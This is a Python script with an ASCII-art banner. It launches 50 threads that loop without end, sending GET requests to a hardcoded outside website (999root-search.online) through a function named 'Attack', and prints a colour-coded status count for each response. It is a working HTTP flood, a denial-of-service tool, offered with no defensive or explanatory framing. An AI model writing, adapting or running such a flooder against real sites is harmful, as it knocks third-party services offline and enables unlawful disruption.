
import threading
import requests
import asyncio

from cachecontrol import CacheControl
from cachecontrol.caches import FileCache

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    string = """
                ` : | | | |:  ||  :     `  :  |  |+|: | : : :|   .        `              .
                    ` : | :|  ||  |:  :    `  |  | :| : | : |:   |  .                    :
                        .' ':  ||  |:  |  '       ` || | : | |: : |   .  `           .   :.
                                `'  ||  |  ' |   *    ` : | | :| |*|  :   :               :|
                        *    *       `  |  : :  |  .      ` ' :| | :| . : :         *   :.||
                            .`            | |  |  : .:|       ` | || | : |: |          | ||
                    '          .         + `  |  :  .: .         '| | : :| :    .   |:| ||
                        .                 .    ` *|  || :       `    | | :| | :      |:| |
                .                .          .        || |.: *          | || : :     :|||
                        .            .   . *    .   .  ` |||.  +        + '| |||  .  ||`
                    .             *              .     +:`|!             . ||||  :.||`
                +                      .                ..!|*          . | :`||+ |||`
                    .                         +      : |||`        .| :| | | |.| ||`     .
                    *     +   '               +  :|| |`     :.+. || || | |:`|| `
                                            .      .||` .    ..|| | |: '` `| | |`  +
                .       +++                      ||        !|!: `       :| |
                            +         .      .    | .      `|||.:      .||    .      .    `
                        '                           `|.   .  `:|||   + ||'     `
                __    +      *                         `'       `'|.    `:
                "'  `---"''"----....____,..^---`^``----.,.___          `.    `.  .    ____,.,-
                    ___,--'""`---"'   ^  ^ ^        ^       "'''---,..___ __,..---"'''
                --"'      &nnbsp;                    ^                         ``--..,__  
                     ________                                  __                
                    /  _____/_____ _______  _________    _____/  |_ __ _______   
                    /   \  ___\__  \\_  __ \/ ___\__  \  /    \   __\  |  \__  \  
                    \    \_\  \/ __ \|  | \/ /_/  > __ \|   |  \  | |  |  // __ \_
                    \______  (____  /__|  \___  (____  /___|  /__| |____/(____  /
                            \/     \/     /_____/     \/     \/                \/ 

"""
    print(bcolors.OKGREEN + string + bcolors.ENDC)

async def Attack() -> None:

    global connected
    global sessions

    r = session.get("https://999root-search.online/", headers={"User-Agent": "Sym", "Accept-Encoding": "deflate"})
    connected += 1

    if r.status_code == 200:
        print(bcolors.BOLD + bcolors.OKCYAN + f"                        --> 200 ... [{connected}]" + bcolors.ENDC)
    if r.status_code == 502:
        print(bcolors.BOLD + bcolors.FAIL + f"                        --> 502 ... [{connected}]" + bcolors.ENDC)
    if r.status_code == 403:
        print(bcolors.BOLD + bcolors.OKGREEN + f"                        --> 403 ... [{connected}]" + bcolors.ENDC)
    else:
        print(f"                        --> {r.status_code} ... [{connected}]")

def async_trigger():
    while 1:
        asyncio.run(Attack())

if __name__ == "__main__":

    banner()
    
    print('\n')

    num_threads = 50
    session = CacheControl(requests.Session(), cache=FileCache('.web_cache'))
    connected = 0
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=async_trigger)
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()
